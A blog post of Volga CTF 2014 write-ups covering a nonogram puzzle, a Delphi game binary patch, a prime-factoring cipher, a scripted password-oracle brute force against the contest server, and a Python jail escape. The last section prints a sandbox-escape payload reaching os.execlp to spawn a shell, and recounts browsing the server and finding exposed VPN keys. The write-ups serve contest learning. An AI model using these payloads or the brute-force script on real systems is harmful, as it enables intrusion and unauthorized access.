---
layout: post
title: "Volga CTF 2014 Writeups"
description: ""
category: writeups
tags: [volga2014]
---
<!--{% include JB/setup %}-->

### Joy 200

Japcross.txt resembles a picross/nonogram puzzle. It's a bit large to solve by hand, so we wrote a script to reformat it:

	rows = open('japcross.txt').read().split('\r\n')

	def get(x,y):
		return rows[y].split('\t')[x]

	ver = []
	hor = []
	for y in range(11,44):
		vals = []
		for x in range(11,-1,-1):
			r = get(x,y)
			if not r: break
			vals = [r] + vals
		ver.append(vals)

	for x in range(12,45):
		vals = []
		for y in range(10,-1,-1):
			r = get(x,y)
			if not r: break
			vals = [r] + vals
		hor.append(vals)

	print "width", len(hor)
	print "height", len(ver)
	print
	print "rows"
	for row in ver:
		print ','.join(row)
	print
	print "columns"
	for col in hor:
		print ','.join(col)

Then, we submitted it to an online solver [here](http://www.comp.lancs.ac.uk/~ss/nonogram/auto):

![The solution](/assets/images/volga2014/joy200.png)

The QR code encodes "longing for you drove me through the stars. Alexei Tolstoy". This entire string was the flag.


<!--more-->

### Joy 300

CTFy Rocket is a Flappy Bird clone apparently developed in Borland Delphi. The stated goal in the challenge description is to reach the 42nd "parsec". 

In TForm1_Timer1Timer we find the code that checks for collisions and travel out of bounds. By debugging the game and setting breakpoints, we find that there are two large conditional blocks responsible for collision checking:

	if ( *(_DWORD *)(v8 + 68) < *(_DWORD *)(v9 + 68) + 600
	< more expressions >
	&& *(_DWORD *)(*(_DWORD *)(v2 + 760) + 64) < *(_DWORD *)(*(_DWORD *)(v2 + 788) + 64) + 100 )
	dword_45CE14 = 572;

	if ( *(_DWORD *)(v13 + 68) < *(_DWORD *)(v14 + 68) + 600
	< more expressions >
	&& *(_DWORD *)(*(_DWORD *)(v2 + 760) + 64) < *(_DWORD *)(*(_DWORD *)(v2 + 788) + 64) + 100 )
	dword_45CE14 = 1323;

Then, `dword_45CE14` is later compared to 572. If greater than or equal, the game ends:

	if ( dword_45CE14 >= 572 )
	  {
	    Controls__TControl__SetVisible(*(_DWORD *)(v2 + 760), 0);
	    unknown_libname_442(*(_DWORD *)(v2 + 792), 0);
	    LOBYTE(v11) = 1;
	    Controls__TControl__SetVisible(*(_DWORD *)(v2 + 808), v11);
	    LOBYTE(v12) = 1;
	    Controls__TControl__SetVisible(*(_DWORD *)(v2 + 840), v12);
	    Controls__TControl__SetLeft(*(_DWORD *)(v2 + 808), *(_DWORD *)(*(_DWORD *)(v2 + 760) + 64));
	    Controls__TControl__SetTop(*(_DWORD *)(v2 + 808), *(_DWORD *)(*(_DWORD *)(v2 + 760) + 68));
	  }

On several occasions, the text of a hidden caption is manipulated in a function that didn't appear fun to reverse:

	Controls__TControl__GetText(*(_DWORD *)(v2 + 816), &v27);
	sub_4581B4(v27, v7, &v29);
	Controls__TControl__SetText(*(_DWORD *)(v2 + 816), v29);

The number of times this occurred also proved difficult to calculate, so we focused on removing collision checks instead.

After the game began, we patched the binary to set `dword_45CE14` to 256 each time a collision occured. Then, we were able to fly through the level ignoring obstacles. Once we reached the 42nd parsec, the hidden caption was revealed and it contained our flag.

### Crypto 100

Initially, this challenge was very difficult. Though the encoding function was easy to analyze and reimplement, decoding the provided plaintext required some algorithmic skill. Here is the original encoding function:

	def encode(s):
		n = 1
		i = 0
		for c in s:
			if c not in string.letters: break
			c = ord(c.upper())-ord('A')
			n *= pow(primes[c],primes[i])
			i += 1
		return n

Note that any character that is not a character between A-Z is ignored, along with the rest of the string. This behavior matches what we observed from the service on port 28121. A hint was later provided: "the plaintext we encrypted using the oracle is a single meaningful word." Having reproduced the encoding function, I tried encoding each of 60 million words appearing in the English Wikipedia, but found no matches.

Then, the challenge was updated. The only modification was that primes expressible as the sum of previous primes were omitted from the primes table. That is, previously, a `2^5` might have represented either A's in the first and second positions, or an A in the third position. The updated challenge skipped 5 and represented the third position by 7 instead. So, the new challenge simply required factoring the provided number in Mathematica:

	n = 1514765623131713617459556538106848713973303979708039641578
	...
	595865360437951910254909481033;

	SortBy[FactorInteger@n, Last]
	{ {59, 2}, {3889, 3}, {1993357, 7}, {127, 13}, {15569, 59}, {241, 127}, {487, 487}, {7789, 971}, {29, 2219}, {249181, 3889} }

This was short enough to solve manually. Rather than calculate the appropriate new primes, I simply encoded A-Z using the service. Examining only prime exponents for now, the solution is `FLUG_NH_IM_R`, leaving `29^2219` unused. `29+241+1949=2219`, so we deduce that the remaining characters are E's. `FLUGENHEIMER` was the flag. 

(The English Wikipedia wordlist included Flugenheimen, but not Flugenheimer)

### Exploits 100

We are provided a binary and a host/port to connect to. The meat of the binary is:

	while ( 1 )	{
		do {
			read(fd, &input_buf, 15u);
			LOBYTE(v15[0]) = 0;
		}
		while ( strlen((const char *)&input_buf) != 13 );
		v5 = 0;
		for ( i = 0; i <= 11; ++i ){
			if ( pw_buf[i] == *((_BYTE *)&input_buf + i) )
			++v5;
		}
		if ( v5 == 12 ) break;
		v7 = rand() % 1000;
		for ( j = 0; j < v5; ++j )
		{
			for ( k = 1; (unsigned int)k <= 0xDEADBEEE; ++k )
			v7 = k ^ (k + v7);
		}
		sprintf(&s, "%x\n", v7);
		write(fd, &s, strlen(&s) - 1);
	}
	write(fd, flag_buf, strlen(flag_buf) - 1);

This reads in a string one character at a time, then compares it to a 12-character password. For each character that matches, `v5` is incremented. Then, it does some processing on a random variable `v7` unless `v5` is zero, and prints out `v7`. 

There are several possible approaches to this problem. It might be possible to determine some information about `v5` given several values of `v7` for the same string, but that'd be pretty difficult. We can also perform a timing attack on the `v5` value, since iteration from 1 to `0xDEADBEEE` takes a significant amount of time. 

However, we noted that `v7` will always be less than 1000 unless `v5` is greater than zero, and that `v7` will almost certainly be larger than 1000 if `v5` is nonzero. We infer that if the value returned is greater than 1000, at least one character matched the password.

So, we must first find a character that is not in the password. The string `'aaaaaaaaaaaa'` consistently returns numbers under 1000, so we can assume that `'a'` is not in the password. 

Then, we test the strings `'baaaaaaaaaaa'`, `'caaaaaaaaaaa'`, and so on until we receive a number greater than 1000 and advance to the next character. We used a script to automate this:

	import telnetlib
	import time
	import string 

	# t = telnetlib.Telnet('127.0.0.1', 7026)
	t = telnetlib.Telnet('tasks.2014.volgactf.ru', 28111)
	t.read_until('characters\n')
	def try_password(pw):
		print "trying", pw
		t.write(pw+'\n')
		return int(t.read_some(),16)

	cs = string.letters+string.punctuation+string.digits+' '
	a = ''
	for i in range(12):
		for c in cs:
			s = 'a'*(i)+c+'a'*(12-i-1)
			if try_password(s) > 1000:
				a+=c
				break

	print a

The password we extracted by this method was `S@nd_will2z0`, and providing this as the password returns the flag `Time_works_for_you`. Perhaps a timing attack was the intended solution?

### Exploits 300

We're challenged to escape a jail, and a few first submissions return Python-style errors. 

Apart from missing builtins, there appear to be no restrictions on input characters, so we don't need any encoding tricks. 

In a local interpreter I tried to find a reference to `os` so I could open a shell. We can start by listing the subclasses of `object`:

	>>> object.__subclasses__()
	[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]

To reach `object` in the challenge, it was necessary to follow the class hierarchy from any object, like a number or tuple. We can instantiate a file object and read it:

	>>> ().__class__.__bases__[0].__subclasses__()[40]
	<type 'file'>
	>>> ().__class__.__bases__[0].__subclasses__()[40]('filename.txt','r').read()

Then, we tried reading `flag`, `key`, `flag.txt` and so on, none of which were found. Then, we noticed that we had an absolute path to `exploit300.py` (`/home/john/exploit300.py`) in the traceback when EOF is sent. So, we read that absolute path and retrieved the script, included farther below. As suspected, though the builtins are empty, there are no restrictions on input. Now we need to get a shell. [Eindbazen's pCTF pyjail solution](http://eindbazen.net/2013/04/pctf-2013-pyjail-misc-400/) used the same trick to get a list of classes, and then indexed into it to traverse to the `os` module: 

	().__class__.__bases__[0].__subclasses__()[48].__init__.__globals__['linecache'].os.execlp('sh','')

However, this was running in a different Python environment, so it wasn't clear what the class at index 48 was supposed to be. I checked a few numbers around it and found that 52, `warningmessage`, worked.

	().__class__.__bases__[0].__subclasses__()[52].__init__.__globals__['linecache'].os.execlp('sh','')

Now we had a shell, and in the root directory, which is why `flag.txt` was not found. The flag was located at `/home/john/flag.txt`. We should have checked that path earlier.

Having solved the problem, we explored the system a bit and found some world-readable VPN configuration files and client keys(!) in `/ov/oooooo`. We also discovered that flag.txt and exploit300.py were writable by the `john` user. Though tempting, we didn't modify either. In short, this wasn't much of a sandbox.

When trying to find the pyjail solution we referenced, we came across a writeup for picoCTF's Python Eval 5, and discovered that this problem was identical down to the indentation style, apart from a comment, the prompt text, and the allowed length:

	#!/usr/bin/python -u                            | from sys import modules
	# task5.py                                      | modules.clear()
	# A real challenge for those python masters out | del modules
	                                                |
	from sys import modules                         | _raw_input = raw_input
	modules.clear()                                 | _BaseException = BaseException
	del modules                                     | _EOFError = EOFError
	                                                |
	_raw_input = raw_input                          | # he-he
	_BaseException = BaseException                  | __builtins__.__dict__.clear()
	_EOFError = EOFError                            | __builtins__ = None
	                                                |
	__builtins__.__dict__.clear()                   | print '>>> Just escape me...'
	__builtins__ = None                             |
	                                                | while 1:
	print 'Get a shell, if you can...'              |   try:
	                                                |     d = {'x':None}
	while 1:                                        |     exec 'x='+_raw_input()[:500] in d
	  try:                                          |     print 'ret:', d['x']
	    d = {'x':None}                              |   except _EOFError, e:
	    exec 'x='+_raw_input()[:50] in d            |     raise e
	    print 'Return Value:', d['x']               |   except _BaseException, e:
	  except _EOFError, e:                          /     print 'Exception:', e
	    raise e                                     <
	  except _BaseException, e:                     <
	    print 'Exception:', e                       <

